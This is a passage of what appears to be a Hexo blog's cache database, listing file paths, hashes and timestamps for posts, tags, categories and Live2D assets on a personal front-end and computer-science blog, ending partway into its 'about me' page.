5060b7fb","modified":1680662617895},{"_id":"public/2020/12/03/Vue.js实战（7）/index.html","hash":"691fcd6d8f746ad82ba70475e62bd345682e7c8f","modified":1680662617895},{"_id":"public/2020/12/01/Vue.js实战（6）/index.html","hash":"2ff81ea1a0815aca3781cbdb3a17f8b55fa86dcd","modified":1680662617895},{"_id":"public/2020/11/29/Vue实战问题/index.html","hash":"6b65eceab9436247c07961057b2e1b73e74880a6","modified":1680662617895},{"_id":"public/2020/11/27/Vue.js实战（5）/index.html","hash":"4fd2d481fe4913198eab7eb225866fa81b823c25","modified":1680662617895},{"_id":"public/2020/11/20/Vue.js实战（4）/index.html","hash":"5fa44b8014905a9f6ce753cf4bf7889867eee109","modified":1680662617895},{"_id":"public/2020/11/20/Vue_Shopping_Car/index.html","hash":"c24ba0cc334d008cd82c5afca6473e05ded6145d","modified":1680662617895},{"_id":"public/2020/11/20/Vue.js实战（3）/index.html","hash":"feb342a0a29768f113bf628ae245177507a09b46","modified":1680662617895},{"_id":"public/2020/11/18/Vue.js实战（2）/index.html","hash":"6472f36ea6e20cc5cf2fd7c7ad02ea654f5b4d1b","modified":1680662617895},{"_id":"public/2020/11/18/Ch3 计算属性/index.html","hash":"edd0cec87cef5e6b08626a02af3b984ae4045b51","modified":1680662617895},{"_id":"public/2020/11/17/Vue.js实战（1）/index.html","hash":"33000b5d5ec8145415d295f891871be122a0b8a5","modified":1680662617895},{"_id":"public/2020/11/12/VUE错误笔记/index.html","hash":"c41e1d221ba733b370817e612090a585bf315339","modified":1680662617895},{"_id":"public/2020/11/07/机器学习-CH2-模型评估与选择/index.html","hash":"d7ab3e198ce1687d2a0fe00892fe847f5b28797a","modified":1680662617895},{"_id":"public/2020/11/05/机器学习-CH1-绪论/index.html","hash":"0237d8db1a34de96208a71648870c5daa51ba6a5","modified":1680662617895},{"_id":"public/2020/11/04/AES/index.html","hash":"d979911f03224a10aea681caabb5465199eb9c95","modified":1680662617895},{"_id":"public/2020/11/03/密码学/index.html","hash":"04a4ca56bc6ecf3052212f00db9a86a3c8feef3d","modified":1680662617895},{"_id":"public/2020/11/02/Hexo+Nginx+阿里云服务器搭建Blog相关/index.html","hash":"65305b26da1c5ce2c6928c3f8f92f7f49fd95592","modified":1680662617895},{"_id":"public/2020/10/28/hello-world/index.html","hash":"7fd04a0ac009f3be2295ac3671e9229b78fdcec9","modified":1680662617895},{"_id":"public/2020/10/26/欢迎使用CSDN-markdown编辑器/index.html","hash":"35b84473a6540d170774dade263cde94bd2e839d","modified":1680662617895},{"_id":"public/archives/page/2/index.html","hash":"613b4d574187b550acef3369c70335cc7d147bea","modified":1688455592481},{"_id":"public/archives/page/3/index.html","hash":"33e112cb3fc0b8dbf9b585d8a01c66984a721640","modified":1688455592481},{"_id":"public/archives/page/4/index.html","hash":"c75bf8cf67765e354365291e70cdafae56ed56c4","modified":1688455592481},{"_id":"public/archives/page/5/index.html","hash":"a0cedaca1b370a07eb3771796f2113fdee8fa6cb","modified":1688455592481},{"_id":"public/archives/page/6/index.html","hash":"d02dc3fd21e270a6baf1485b77d29735908ed506","modified":1688455592481},{"_id":"public/archives/2020/index.html","hash":"36dda5c6517f038d9d75c90ac66d2397fb836280","modified":1688455592481},{"_id":"public/archives/2020/page/2/index.html","hash":"57c8d733d9daeeecc5abe1a4f0ddbd915db432d1","modified":1688455592481},{"_id":"public/archives/2020/10/index.html","hash":"821ca95f97c2c86b505981d7dad6ff5e1dd4b127","modified":1688455592481},{"_id":"public/archives/2020/11/index.html","hash":"a56f45a0cf6c47bbf09b1dec8b5f753c44a8156e","modified":1688455592481},{"_id":"public/archives/2020/11/page/2/index.html","hash":"8d62371647ca487022ce64a7281fe28a30cd70b6","modified":1688455592481},{"_id":"public/archives/2020/12/index.html","hash":"d60304f6df55101e6bf5765e53fb283d0f7ac04c","modified":1688455592481},{"_id":"public/archives/2021/index.html","hash":"9f54acb1df02080eb6333cec88626e07f645ae8a","modified":1688455592481},{"_id":"public/archives/2021/page/2/index.html","hash":"f9d9d1c17859ddf2c4ef1dea5dd647ae84934e42","modified":1688455592481},{"_id":"public/archives/2021/01/index.html","hash":"3dc5cfb85189a371a4cc988a9303eeac3bcb4472","modified":1688455592481},{"_id":"public/archives/2021/03/index.html","hash":"33dc87b45b5a39a95444d1b34ed16fb8322f5abf","modified":1688455592481},{"_id":"public/archives/2021/04/index.html","hash":"ef0439561b073d69536580870548113e2bbc58fa","modified":1688455592481},{"_id":"public/archives/2021/07/index.html","hash":"94deaa1ee73f438928ac38c5e071c74c40b215e5","modified":1688455592481},{"_id":"public/archives/2021/08/index.html","hash":"d0618c4515f6332e799ef636c4d1939d84705487","modified":1688455592481},{"_id":"public/archives/2021/08/page/2/index.html","hash":"f43fbd4b7af02068c8e0c21ae94991607e30f4d9","modified":1688455592481},{"_id":"public/archives/2022/index.html","hash":"528b05ff2fb96767ddf3140d5512704c803758b3","modified":1688455592481},{"_id":"public/archives/2022/10/index.html","hash":"9e88c68c7eb2676191f4633dbedb7e6dd5446b21","modified":1688455592481},{"_id":"public/archives/2023/page/2/index.html","hash":"b2b7aaaba51c78965830e76b15632c60f65bf94b","modified":1688455592481},{"_id":"public/archives/2023/03/index.html","hash":"c4e4c3f4ff111e164a65bdd997ba56106cfa8c5a","modified":1688455592481},{"_id":"public/archives/2023/03/page/2/index.html","hash":"6d21861f920b9dd79d5e5bd83a3b08de9e1f408a","modified":1688455592481},{"_id":"public/categories/编程/index.html","hash":"8dc297426c2fe3386122e7abdd7ca8f27d37f405","modified":1680662617895},{"_id":"public/categories/前端/index.html","hash":"ce0b78b3a89ab5e61511c47d1b1c27f09113dda3","modified":1687915760359},{"_id":"public/categories/前端/page/2/index.html","hash":"99ec6e09de52020c23d8cef6c51a5a3b6174daf1","modified":1687915760359},{"_id":"public/categories/前端/page/3/index.html","hash":"49bb49ae6806c959f3bf28fe865f9e571e34b9b5","modified":1687915760359},{"_id":"public/categories/网站/index.html","hash":"54b39b023be71934991ff7b92863d18d2bbde7c3","modified":1680662617895},{"_id":"public/categories/算法/index.html","hash":"8f42170c22c0cf178f95c645c49a4618ebfc493d","modified":1680662617895},{"_id":"public/categories/日常/index.html","hash":"de59b0cfbdf9f98d0dfd639be09adf0ac118970a","modified":1687915619220},{"_id":"public/categories/网络安全/index.html","hash":"f1c62d8c104d540dfef829f0eecedf4f53dfb53b","modified":1680662617895},{"_id":"public/categories/密码学/index.html","hash":"1a971799a225e999dfcb6e398a0af08139302445","modified":1680662617895},{"_id":"public/categories/JS/index.html","hash":"fb0f7c8ae5b9fe80dfe2669eac817160a097c2d7","modified":1680662617895},{"_id":"public/categories/信息隐藏/index.html","hash":"7cb3e51cc53622a55214c9e8439921d78d61604d","modified":1680662617895},{"_id":"public/categories/数字水印/index.html","hash":"8d0fcaca522a0ff3fc330bce5f0a8957375bf62e","modified":1680662617895},{"_id":"public/categories/计算机科学/index.html","hash":"0d8c484f81f822fe344150031b925842afd9f970","modified":1680662617895},{"_id":"public/categories/关于Markdown的使用/index.html","hash":"ce1eb6571b10239fefd632c0ddab1c183a134422","modified":1680662617895},{"_id":"public/tags/C语言/index.html","hash":"51c88e275b49c8396630883d7ae577013ef80eb9","modified":1680662617895},{"_id":"public/tags/VUE/index.html","hash":"682510676ef40fa79ef960f090258a6898c55c49","modified":1687915760359},{"_id":"public/tags/VUE/page/2/index.html","hash":"d5d426ae8c112f98bab8364a0a0c3a8e358614f2","modified":1687915760359},{"_id":"public/tags/笔记/index.html","hash":"cf3edf10c2cc04cbee63f161d8a64af968efe493","modified":1688455592481},{"_id":"public/tags/笔记/page/2/index.html","hash":"3fb460c6eaca4044f060f8324312aab1e9b5fdbe","modified":1688455592481},{"_id":"public/tags/笔记/page/3/index.html","hash":"9674f9d4258b761e25605bdfe84621321cda7f94","modified":1688455592481},{"_id":"public/tags/笔记/page/4/index.html","hash":"07cb949fa0e445d86b41fab444d6f1ef24fc91bd","modified":1688455592481},{"_id":"public/tags/Vue-js实战/index.html","hash":"8e135ce086e4143c690accf297c0bcc8163eb30a","modified":1680662617895},{"_id":"public/tags/Vue-js实战/page/2/index.html","hash":"0267408548427b5754505d1d16db53963124b023","modified":1680662617895},{"_id":"public/tags/Web/index.html","hash":"5efff93eeda7c1a3dff965a553a068a18782fb26","modified":1680662617895},{"_id":"public/tags/Hexo/index.html","hash":"a25dc7605aa9f70d8c898d59086e5dee2080d10b","modified":1680662617895},{"_id":"public/tags/阿里云/index.html","hash":"40f9aaf32effd892589d31ff09d9d3f8f911c6a7","modified":1680662617895},{"_id":"public/tags/王道考研/index.html","hash":"b42b81b6d4164a35e9c32ca899e7ecf044e833d9","modified":1680662617895},{"_id":"public/tags/计算机网络/index.html","hash":"2cf50bcd0435928adea870c55196cb8a77bd5351","modified":1680662617895},{"_id":"public/tags/Javascript/index.html","hash":"98a0802c512156e3096717cfc78e787172788b73","modified":1680662617895},{"_id":"public/tags/Javascript高级程序设计/index.html","hash":"15a371b14e67908239da2f1af69413bd81c257dd","modified":1680662617895},{"_id":"public/tags/Nuxt/index.html","hash":"aa9b9d89a1fc7f0ea21a244ffa7e331209ef569b","modified":1680662617895},{"_id":"public/tags/Node/index.html","hash":"3b2eac38a3a7f3ad2784ba1b02e8a7546f9e2603","modified":1680662617895},{"_id":"public/tags/React/index.html","hash":"8fd949b30e0e6e6e7276c89a4f2851938a9a49a7","modified":1680662617895},{"_id":"public/tags/日常/index.html","hash":"dfe8724fbac2f6f6325ff8e6629f3a82229fd43a","modified":1680662617895},{"_id":"public/tags/音乐推荐/index.html","hash":"ab09fe754cb21d852b5acf61d7238ee8295ae1f9","modified":1680662617895},{"_id":"public/tags/SQL/index.html","hash":"d14ad352df7e19abf4bc619f58cfe536b27e323e","modified":1680662617895},{"_id":"public/tags/项目构建/index.html","hash":"d69b11beea812050b671ad63697650738e53ec70","modified":1680662617895},{"_id":"public/tags/密码学/index.html","hash":"ec9fabe68ca6a4b156f690c04930bca6f5be1ec1","modified":1680662617895},{"_id":"public/tags/AES/index.html","hash":"7a5ed8eeb6364afbed3fbe61e12922b5956866c4","modified":1680662617895},{"_id":"public/tags/面试/index.html","hash":"a8cae77119d34abb8572d61803d3850a795bc7be","modified":1680662617895},{"_id":"public/tags/3D/index.html","hash":"d480a1cc672db24fe920bb171b4850e11e460dbe","modified":1680662617895},{"_id":"public/tags/JS/index.html","hash":"99f60e144bb69d4e3120700927ede9c1a9521c03","modified":1687915760359},{"_id":"public/tags/可视化/index.html","hash":"27cd0e032b4820a18e899cdfda1c15c15943107a","modified":1680662617895},{"_id":"public/tags/摄影/index.html","hash":"7056059f61a240a8bfe7a9946518407aa2174d73","modified":1680662617895},{"_id":"public/tags/网络安全/index.html","hash":"b0185e822d187c4c52d1c450c2676fcafa6e4a9f","modified":1680662617895},{"_id":"public/tags/面试笔记/index.html","hash":"e8167976e7af94627bf44e83bfb4eb737a6a40f0","modified":1680662617895},{"_id":"public/tags/概论/index.html","hash":"629dd982f7a9570c861da5fcae5681d465fdb7c9","modified":1680662617895},{"_id":"public/tags/信息隐藏/index.html","hash":"2f21b171c6399a69f998e2ee88b1331f2d62b705","modified":1680662617895},{"_id":"public/tags/数字水印/index.html","hash":"9f7ed4d66db253b81f3e6787fe5166f02ae43d8b","modified":1680662617895},{"_id":"public/tags/机器学习/index.html","hash":"ebe6778bef2f68a7ed74d071b1f69c848922a9a5","modified":1680662617895},{"_id":"public/tags/Security/index.html","hash":"0b63104d57b84e3b66759ba87c1077e3d40011eb","modified":1680662617895},{"_id":"public/tags/Markdown/index.html","hash":"86e774065a2634015ca839a853e8ffb046ee199e","modified":1680662617895},{"_id":"public/tags/贪心算法/index.html","hash":"21bebaac516297451d4e5a243139523bda5e8356","modified":1680662617895},{"_id":"public/page/2/index.html","hash":"71674230c94b554181e065f322e0b7331602a830","modified":1688455592481},{"_id":"public/page/3/index.html","hash":"29b325da9a59d77de9c80c73aea940a7b76cd7a0","modified":1688455592481},{"_id":"public/page/4/index.html","hash":"497402eba59fb292eb6e343c87ee81f31d7e5a0c","modified":1688455592481},{"_id":"public/page/5/index.html","hash":"e57c67513909df511bd8303e773faa686198bc08","modified":1688455592481},{"_id":"public/page/6/index.html","hash":"971a8b57d35224e3daf0e1aa9b2ea081819b30e6","modified":1688455592481},{"_id":"source/about/index.md","hash":"c6d1b652da93d2fb475a81589fca3728b1a8ef21","modified":1680617067453},{"_id":"public/about/index.html","hash":"cb44b88b20714ae3e670073704817a1dc5fd7278","modified":1680662617895},{"_id":"public/2022/11/12/Webpack体系/index.html","hash":"3d1a898ab3f8bc58f0b80be626b83edf565cf90a","modified":1680662617895},{"_id":"public/2022/10/12/JS/index.html","hash":"be5f170011acbd819df5c92590f92e5fbc180341","modified":1680662617895},{"_id":"public/2022/09/12/JS基础/index.html","hash":"bc7abdbf50048791417707d93feb05df5b80d07f","modified":1680662617895},{"_id":"public/categories/前端/page/4/index.html","hash":"75d614fd524fa6b0ccb3c77dfef3c750b2324c1f","modified":1687915760359},{"_id":"public/archives/2022/09/index.html","hash":"229fe959e8d0ea80dcc096e06ddf40a33be574f8","modified":1688455592481},{"_id":"public/archives/2022/11/index.html","hash":"03399b389f9e01e634af736d83712abc29a0d3af","modified":1688455592481},{"_id":"source/_posts/Sakura.md","hash":"d25b66d4d0f98abf3ff1566341d8e6a180c32f12","modified":1680615938912},{"_id":"public/2023/04/04/Sakura/index.html","hash":"7a29eefdeb488440b8d71dc4905748cf03c0b561","modified":1680751626851},{"_id":"public/live2dw/lib/L2Dwidget.min.js","hash":"5f1a807437cc723bcadc3791d37add5ceed566a2","modified":1680616673678},{"_id":"public/live2dw/lib/L2Dwidget.min.js.map","hash":"3290fe2df45f065b51a1cd7b24ec325cbf9bb5ce","modified":1680616673678},{"_id":"public/live2dw/lib/L2Dwidget.0.min.js","hash":"35bb5b588b6de25c9be2dd51d3fd331feafac02d","modified":1680616673678},{"_id":"public/live2dw/lib/L2Dwidget.0.min.js.map","hash":"35e71cc2a130199efb167b9a06939576602f0d75","modified":1680616673678},{"_id":"public/live2dw/assets/exp/f01.exp.json","hash":"84073a497ddb6e56c6cfc244a0fb217ba473abf9","modified":1680616793307},{"_id":"public/live2dw/assets/exp/f02.exp.json","hash":"241b6afafa2e25c6d7a54692a8b5aa060a137ab1","modified":1680616793307},{"_id":"public/live2dw/assets/exp/f04.exp.json","hash":"35e746ede62e7090e7dfb08561d77772f58b4153","modified":1680616793307},{"_id":"public/live2dw/assets/exp/f03.exp.json","hash":"fbf7729e504f14f83f976827fcf62301a6579a34","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/flickHead_00.mtn","hash":"f64c79c9171660db5c440bef229ac2e35a1597d5","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/flickHead_01.mtn","hash":"a1011d6bf397bcd3c3c968d9616f88fe1ffbc83c","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/idle_00.mtn","hash":"378b4577217c604c9d28ab4edf8b707c8d8c2fbb","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/flickHead_02.mtn","hash":"d3c9c0acb4dc25a2274f3b9faa71e5ce60ad92e4","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/idle_01.mtn","hash":"88c2494655dbb712b842f03232b619f381753d52","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/idle_02.mtn","hash":"7f5d2cf8706007c8659938eba132a68c470a4c26","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/pinchIn_00.mtn","hash":"70978b4c983f6a9fd6d3d9c24571586f7d6eac30","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/pinchIn_02.mtn","hash":"aa0d66ca9b06c374577fd7e64e89756de1e1f2ae","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/pinchIn_01.mtn","hash":"a5fefb45115695db72b9499e627a51b2b9394f2c","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/pinchOut_00.mtn","hash":"e07fe8fd8c2810e3c1d28b730bd49c8c25849bad","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/pinchOut_01.mtn","hash":"e05df948d08b17f34c993a9c1f901190509d5db0","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/pinchOut_02.mtn","hash":"b323fd350d334b33bbdfb31194ae664089986c27","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/shake_00.mtn","hash":"5185d02c7ab9f0bec3d4a890b54b2378e553373d","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/shake_01.mtn","hash":"e812985a56796e122018f9d57d1606a4866ff7d1","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/tapBody_00.mtn","hash":"835aa3d4a8fbd26c0bb66b164a19464fa3f17a99","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/shake_02.mtn","hash":"2702970805e07777974c383613e631730982bcff","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/tapBody_02.mtn","hash":"a75acb51c1191ce5050d3ee1af6f2dcc787c7c5e","modified":1680616793307},{"_id":"public/live2dw/assets/mtn/tapBody_01.mtn","hash":"78fca17436ab5e065e27f419f135aa6c0a0b52ef","modified":1680616793307},{"_id":"public/live2dw/assets/shizuku.model.json","hash":"19a05bd41b806a935cea42c2000626fc82da2536","modified":1680616793307},{"_id":"public/live2dw/assets/shizuku.physics.json","hash":"6484d646e79a44c83784c6ae434cf7349746c5c8","modified":1680616793307},{"_id":"public/live2dw/assets/shizuku.pose.json","hash":"ac5505efbf80ba0a2e5783d67fe232bc5c6f1f80","modified":1680616793307},{"_id":"public/live2dw/assets/snd/flickHead_00.mp3","hash":"356388d939006b03cf9e6158c603b58d4800bec1","modified":1680616793307},{"_id":"public/live2dw/assets/snd/flickHead_01.mp3","hash":"436d0bbccf6e7a2744447554947eee4563608970","modified":1680616793307},{"_id":"public/live2dw/assets/snd/flickHead_02.mp3","hash":"5f63477ce63f2073e24d68fea906fe136fe6349e","modified":1680616793307},{"_id":"public/live2dw/assets/snd/pinchIn_00.mp3","hash":"f9baa3b7cadec20b714135fc49cfab3ff6adeeb4","modified":1680616793307},{"_id":"public/live2dw/assets/snd/pinchIn_01.mp3","hash":"d5c8cc6f61b56222a83a5174f75006f83c3b88da","modified":1680616793307},{"_id":"public/live2dw/assets/snd/shake_00.mp3","hash":"f65dd58e7b44ec5c865d13c190316070b625b5fe","modified":1680616793307},{"_id":"public/live2dw/assets/snd/shake_01.mp3","hash":"c1e0e8a07ff268ee06c2b7825d1b645e193f21b9","modified":1680616793307},{"_id":"public/live2dw/assets/snd/shake_02.mp3","hash":"8882b94bce00f09232588b7301badb105fa8acab","modified":1680616793307},{"_id":"public/live2dw/assets/snd/tapBody_00.mp3","hash":"003e68a59a9c8392e230f34c91860efbd946277a","modified":1680616793307},{"_id":"public/live2dw/assets/snd/tapBody_01.mp3","hash":"5314b50f153df71559e51e2586581c006df00722","modified":1680616793307},{"_id":"public/live2dw/assets/snd/tapBody_02.mp3","hash":"15e7815ed0a0e5164e18e0c53b97aedc742a134d","modified":1680616793307},{"_id":"public/live2dw/assets/moc/shizuku.1024/texture_00.png","hash":"21bdb28b31783e23b26b3aa061e90be4088665aa","modified":1680616793307},{"_id":"public/live2dw/assets/moc/shizuku.1024/texture_03.png","hash":"07f568a2bb8045b6bdff7783fb4daf62c821f9ab","modified":1680616793307},{"_id":"public/live2dw/assets/moc/shizuku.1024/texture_05.png","hash":"0cd00007fb8bff62a2eb08e1d7c43abab8722224","modified":1680616793307},{"_id":"public/live2dw/assets/snd/pinchIn_02.mp3","hash":"5b63e02607571ac601c500995e836e6c861b1c62","modified":1680616793307},{"_id":"public/live2dw/assets/snd/pinchOut_00.mp3","hash":"0654f38f6e9fd623eaf8be11b5d58c9d12991949","modified":1680616793307},{"_id":"public/live2dw/assets/snd/pinchOut_01.mp3","hash":"8a081030fd53c07bffe3edd48f87a371ca77296b","modified":1680616793307},{"_id":"public/live2dw/assets/snd/pinchOut_02.mp3","hash":"554edb2f3838cbdc27d1a9c6b8a9cb6eb465cbdd","modified":1680616793307},{"_id":"public/live2dw/assets/moc/shizuku.1024/texture_01.png","hash":"3d0e745f3e560071ee08beeecde186e5ea35d99e","modified":1680616793307},{"_id":"public/live2dw/assets/moc/shizuku.1024/texture_04.png","hash":"f764d594841905db8b2998dd61c329866125ad97","modified":1680616793307},{"_id":"public/live2dw/assets/moc/shizuku.1024/texture_02.png","hash":"055eb2da9c13e9116be93a1e60c0ea2b660af864","modified":1680616793307},{"_id":"public/live2dw/assets/moc/shizuku.moc","hash":"c2670a0f75830edc89d7fe6d074de4ee67e8dc5d","modified":1680616793307},{"_id":"public/live2dw/assets/koharu.physics.json","hash":"2fbf886979212357ba293bd35884f2cb5b26b6a6","modified":1680662260221},{"_id":"public/live2dw/assets/koharu.model.json","hash":"ceccdefd776b7c9475a29cff0842796e4f58b7e9","modified":1680662260221},{"_id":"public/live2dw/assets/mtn/02.mtn","hash":"efc99efdff39c93372cff0f6d62c4e748e1a5593","modified":1680662260221},{"_id":"public/live2dw/assets/mtn/04.mtn","hash":"32c888667455a3ff6f1b04f910c1a5cc4de30af0","modified":1680662260221},{"_id":"public/live2dw/assets/mtn/05.mtn","hash":"637e00442da4042cd4b0ed2cc62ffb1559881814","modified":1680662260221},{"_id":"public/live2dw/assets/mtn/01.mtn","hash":"61d7d590d9feb71b32fd6bd142b59410d75bc1fa","modified":1680662260221},{"_id":"public/live2dw/assets/mtn/06.mtn","hash":"df10cc1d333c96da1296a4853c1ddbd44d8a11f3","modified":1680662260221},{"_id":"public/live2dw/assets/mtn/03.mtn","hash":"a72b697a92a7cff40d15774b143b465b34cee5e6","modified":1680662260221},{"_id":"public/live2dw/assets/mtn/08.mtn","hash":"9b95ef8548b979d1fca557c74f8d66fb15b34578","modified":1680662260221},{"_id":"public/live2dw/assets/mtn/07.mtn","hash":"d8c9410135c81604eba665b59808089808e0851a","modified":1680662260221},{"_id":"public/live2dw/assets/mtn/09.mtn","hash":"ecf1283b72e1c4b7e3a97343cd97726813f18790","modified":1680662260221},{"_id":"public/live2dw/assets/mtn/idle.mtn","hash":"058d4628ab04bf42c279501ba4fa37116d384e41","modified":1680662260221},{"_id":"public/live2dw/assets/moc/koharu.moc","hash":"5eec3fba21444dd6f774b913510b5955e2c0605b","modified":1680662260221},{"_id":"public/live2dw/assets/moc/koharu.2048/texture_00.png","hash":"0879b61b745084781722636bba9f278f31ce5fc1","modified":1680662260221},{"_id":"source/_posts/Linux Shell.md","hash":"e632799f40c566a42b6025fb6d94c24b2a99809c","modified":1680751607795},{"_id":"source/_posts/NodeJS From W3C.md","hash":"0ee53fb1e5b217dbf042062daed64d2fb1ea134b","modified":1680683712085},{"_id":"source/_posts/Session And Cookie.md","hash":"56171b35975620e2d84473e9e1eb88822359394e","modified":1680751581125},{"_id":"public/2023/04/06/Session And Cookie/index.html","hash":"3533371e4054cad0024d6db538aee59b3eeb90ba","modified":1687915619220},{"_id":"public/2023/04/06/Linux Shell/index.html","hash":"ef74fc6b3e59ac754fd178c82858e4636ca357bc","modified":1680751626851},{"_id":"public/2023/04/05/NodeJS From W3C/index.html","hash":"f8288a7a4a0775081401d016bcc53d7d6d3cbc32","modified":1680751626851},{"_id":"public/archives/page/7/index.html","hash":"9c073be624c51df428f6e462f3efda754c158cd3","modified":1688455592481},{"_id":"public/categories/Linux/index.html","hash":"2baaaf7e784e6ab59b88d7338d50595795bc9a10","modified":1680751626851},{"_id":"public/page/7/index.html","hash":"e407977c4316ed42113de3511bce7f9ec64c23f3","modified":1688455592481},{"_id":"public/tags/shell/index.html","hash":"68070667109014c7795f490e3a99e364f2f005d4","modified":1680751626851},{"_id":"public/tags/Linux/index.html","hash":"6545b186e4c775b268356bfe2e758fced4bb5b1d","modified":1680751626851},{"_id":"public/tags/session/index.html","hash":"75deb186d48076e3ea62dca875e7cb61f8b51896","modified":1680751626851},{"_id":"public/tags/cookie/index.html","hash":"5fb1b4849cd41ecba6900905be4928337923178b","modified":1680751626851},{"_id":"source/_posts/CSS实现响应式布局.md","hash":"e0ced8a7ea2db6f69527a7384d5b3b784b3bb7e5","modified":1680788664362},{"_id":"source/_posts/Vue-Admin-Template跳过登陆页面.md","hash":"6e8b4ef8c926aa64d9656f21c322c98e0f9fef94","modified":1687915558100},{"_id":"source/_posts/TS基础.md","hash":"77464606c30e43ea12f6ef330979c92e2cd64b98","modified":1687915701945},{"_id":"source/_posts/如何高效整理论文？.md","hash":"552c243561a562b5ba246d2f2bc4964ea8be2ae4","modified":1687915521647},{"_id":"source/_posts/Web Audio.md","hash":"957cc2793fab9362b4424d4c68839e4f2127e302","modified":1688376940499},{"_id":"public/2023/06/28/如何高效整理论文？/index.html","hash":"f2fc4e27a86db01335f35eca33fc15d2be04adac","modified":1688455592481},{"_id":"public/2023/06/25/Vue-Admin-Template跳过登陆页面/index.html","hash":"bd3f3d7b829ac746ebac7dacd8d0682b4463cca8","modified":1687915760359},{"_id":"public/2023/05/25/TS基础/index.html","hash":"7c5db933b1f85bf7a953696d704edc19e3e236da","modified":1687915619220},{"_id":"public/2023/05/09/Web Audio/index.html","hash":"5810c445e3001ebed014ca653ee122a6fb1c801f","modified":1687915619220},{"_id":"public/2023/04/06/CSS实现响应式布局/index.html","hash":"c03d8f4f6a17fb193f55ef758e4728a81fcc7dff","modified":1687915760359},{"_id":"public/archives/2023/page/3/index.html","hash":"6a07ebfc8495fce9d4344dff2ea93961d8f12eab","modified":1688455592481},{"_id":"public/archives/2023/05/index.html","hash":"efe1a2a6cbbfbf0f13f529c976e80eae2e562270","modified":1687915619220},{"_id":"public/archives/2023/06/index.html","hash":"93ce6f384fe5e812506b10a796d587761915fb4e","modified":1688455592481},{"_id":"public/tags/项目问题/index.html","hash":"303980f673abc9bfd64888c172442b4cdc5296dd","modified":1687915619220},{"_id":"public/tags/科研/index.html","hash":"1cc63e4ff85f2885d8fc08a1f5c7986c4fc8f6da","modified":1687915619220},{"_id":"public/2023/06/26/Web Audio/index.html","hash":"bcf6a993428fb697c9211a031cfdf43566e3de62","modified":1688455592481},{"_id":"public/2023/06/26/TS基础/index.html","hash":"c6719ec7e9d30b23e847e771232b4e9982f4cfc1","modified":1687915760359},{"_id":"public/tags/TS/index.html","hash":"3b4f7f92c8efad068a46cc4b3a5a2afe4c054a0c","modified":1687915760359},{"_id":"source/_posts/Docker一键部署.md","hash":"d2f55a42c25c479403d32fca320c864bdc5d4267","modified":1688454946263},{"_id":"source/_posts/Flask基础.md","hash":"7e1e7720b88c83612e391776e8a9c9843f783be3","modified":1688455590334},{"_id":"source/_posts/Webpack.md","hash":"96349593bcd9633983effadfb3f97c772ae6f1c5","modified":1688040609115},{"_id":"source/_posts/服务端渲染.md","hash":"38093cf6a21fea7d4e575bd8377bcbf769c38e50","modified":1687922755623},{"_id":"public/2023/07/04/Flask基础/index.html","hash":"f004b59802e5df3b0a835bf8a21f46db67b635b7","modified":1688455592481},{"_id":"public/2023/07/02/Docker一键部署/index.html","hash":"3e1930e3c232329c0bd47a4cc5a2d1afb23f810f","modified":1688455592481},{"_id":"public/2023/06/29/Webpack/index.html","hash":"90ca82ccf63f3d44a25320914ba2226b78a28bf8","modified":1688455592481},{"_id":"public/2023/06/28/服务端渲染/index.html","hash":"c8bc2f19bc80b5e772ff49d052fc64ecc4144ee6","modified":1688455592481},{"_id":"public/categories/运维/index.html","hash":"0a7cfb203e2836bd05814edcebbcc150670b2bbe","modified":1688455592481},{"_id":"public/categories/后端/index.html","hash":"0e1da8a75f0907c3291c73887e36ab7ff26a664a","modified":1688455592481},{"_id":"public/archives/page/8/index.html","hash":"9a8bae2c8ecec3c24b9416cf525b71266ceceea1","modified":1688455592481},{"_id":"public/archives/2023/07/index.html","hash":"5beb4a684695178721141525ee54840b7dbb9660","modified":1688455592481},{"_id":"public/tags/Docker/index.html","hash":"33b84ee9981c2b63cf2c2c66dee95ec2277e8276","modified":1688455592481},{"_id":"public/tags/Flask/index.html","hash":"0d10fa05641ed986d104b531bb154d16022de61d","modified":1688455592481},{"_id":"public/tags/Python/index.html","hash":"69cc0cb142307a51eaeb07f80f79bc9a27f30c3d","modified":1688455592481},{"_id":"public/page/8/index.html","hash":"99135a9ee29c892563edddc1411aa9b6f33fb561","modified":1688455592481}],"Category":[{"name":"编程","_id":"clg29vyde0001ao9c30gr3d7m"},{"name":"前端","_id":"clg29vyfr0009ao9chclo4i3i"},{"name":"网站","_id":"clg29vyg0000pao9c6c946wg3"},{"name":"算法","_id":"clg29vyg0000rao9c8b6h4nxs"},{"name":"日常","_id":"clg29vygf001rao9c5f2k9pax"},{"name":"网络安全","_id":"clg29vygk001zao9cfallc8bf"},{"name":"密码学","_id":"clg29vygx002qao9cff8u85ti"},{"name":"JS","_id":"clg29vyh7003kao9caoc1gcj6"},{"name":"信息隐藏","_id":"clg29vyhy005eao9c3vv69kra"},{"name":"数字水印","_id":"clg29vyi1005oao9c6mdthxzw"},{"name":"计算机科学","_id":"clg29vyi2005uao9c4t2a5mw2"},{"name":"关于Markdown的使用","_id":"clg29vyib006yao9ca9c99xvi"},{"name":"Linux","_id":"clg4k4gq50001ww9cd1e82ign"},{"name":"运维","_id":"cljnys8n70002ls9ca1014e09"},{"name":"后端","_id":"cljnys8no0006ls9c2wfi18fz"}],"Data":[],"Page":[{"title":"aboutme","date":"2020-10-27T02:15:49.000Z","type":"aboutme","_content":"\n## About Me\n\n<!-- ![](https://s3.bmp.ovh/imgs/2023/03/27/b3312324adb06368.png) -->\n\n### Part I Introduction\n\n- Master of Computer Science （Grade One、`South-East University`、`Cyber-Sapce Security`）\n- Front-End Programmer For `Nanjing Cursec`\n\n> 90后小菜鸟程序员，喜欢唱跳rap打篮球~\n>\n> 走在学前端的大路上~ 